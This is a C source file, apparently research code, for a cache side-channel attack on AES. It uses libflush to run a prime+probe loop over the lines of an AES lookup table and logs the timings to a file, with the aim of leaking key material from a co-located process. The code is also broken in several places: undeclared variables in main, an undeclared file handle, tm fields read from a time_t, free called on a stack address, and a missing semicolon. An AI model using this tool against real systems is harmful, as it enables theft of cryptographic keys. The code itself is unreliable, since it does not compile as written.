/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include "gaddr.h"
#include "gset.h"
#include <getopt.h>
#include <inttypes.h>
#include <jni.h>
#include <libflush/libflush.h>
#include <malloc.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>


#define BIND_TO_CPU 0
#define BIND_THREAD_TO_CPU 1
#define AES_TABLE_LENGTN 16    // the block num of aes look up table
#define AES_TABLE_SUM 64
                                                          

int main(int argc, char* argv[]) {
  libflush_session_t *libflush_session;

  /* Define parameters */
  size_t cpu;
  cpu = BIND_TO_CPU;
  size_t thread_cpu = BIND_THREAD_TO_CPU;

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  fprintf(stdout, "NUMBER OF CPUS: %zu\n", number_of_cpus);

  /* Bind to CPU */
  cpu = cpu % number_of_cpus;
  thread_cpu = thread_cpu % number_of_cpus;

  if (libflush_bind_to_cpu(cpu) == false) {
    fprintf(stderr, "Warning: Could not bind to CPU: %zu\n", cpu);
  } else {
    fprintf(stdout, "attack process bind to cpu %d\n", BIND_TO_CPU);
  }

  /* Initialize libflush */
  libflush_session_args_t args;
  args.bind_to_cpu = thread_cpu;

  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }

  fprintf(stdout, "initialize libflush success!\n");
  fprintf(stdout, "now start asynchronized aes attack\n");

  uint32_t *tmp;
  tmp = (uint32_t *)malloc(AES_TABLE_SUM * sizeof(uint32_t));
  if (tmp == NULL) {
    fprintf(stderr, "ERROR : could not allocate memory to tmp[%d]!!\n", i);
    return -1;
  }
  memset(tmp, 0, AES_TABLE_SUM * sizeof(uint32_t));

  while (true) {
    getTmpTime2(libflush_session, tmp, base);
  }

  free(tmp);
  fprintf(stdout, "aes asynchronized attack completed\n");
  return 0;
}

void getTmpTime(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
  int base0 = base;
  int base1 = base + 16;
  int base2 = base + 32;
  int base3 = base + 48;
  for (int j = 0; j < AES_TABLE_LENGTN; j++) {
    libflush_prime(libflush_session, base0 + j);
    libflush_prime(libflush_session, base1 + j);
    libflush_prime(libflush_session, base2 + j);
    libflush_prime(libflush_session, base3 + j);
  }
  for (int j = 0; j < AES_TABLE_LENGTN; j++) {
    tmp[j + AES_TABLE_LENGTN * 0] = libflush_probe(libflush_session, base0 + j);
    tmp[j + AES_TABLE_LENGTN * 1] = libflush_probe(libflush_session, base1 + j);
    tmp[j + AES_TABLE_LENGTN * 2] = libflush_probe(libflush_session, base2 + j);
    tmp[j + AES_TABLE_LENGTN * 3] = libflush_probe(libflush_session, base3 + j);
  }
  writeT2TF(tmp);
}

void getTmpTime2(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    libflush_prime(libflush_session, base + j);
  }
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    tmp[j] = libflush_probe(libflush_session, base + j);
  }
  writeT2TF(tmp);
}

void getTmpTime3(libflush_session_t *libflush_session, uint32_t *tmp, int base) {
  uint64_t time = 0;
  for (int j = 0; j < AES_TABLE_SUM; j++) {
    libflush_prime(libflush_session, base + j);
    time = libflush_probe(libflush_session, base + j);
    tmp[j] = time;
  }
  writeT2TF(tmp);
}

void writeT2TF(uint32_t *tmp) {
  FILE* file = NULL;
  if ((file = fopen("asyntime", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file ntime!\n");
    return;
  }
  for (int i = 0; i < AES_TABLE_SUM; i++) {
      fprintf(file, "%10zu", tmp[i]);
  }
  fprintf(file, "\n");
  fflush(file);
  fclose(file);
  for (int i = 0; i <AES_TABLE_SUM; i++) {
    tmp[i] = 0;
  }
}

void writeTimeStamp() {
  time_t time_stamp;
  if ((file = fopen("asyntime", "a")) == NULL) {
    fprintf(stderr, "ERROR : could not open file ntime!\n");
    return;
  }
  time(&time_stamp);
  fprintf(file, "%d.%d.%d ", time_stamp->tm_hour, time_stamp->tm_min, tmp_stamp->sec);
  free(&time_stamp)
  fclose(file);
}
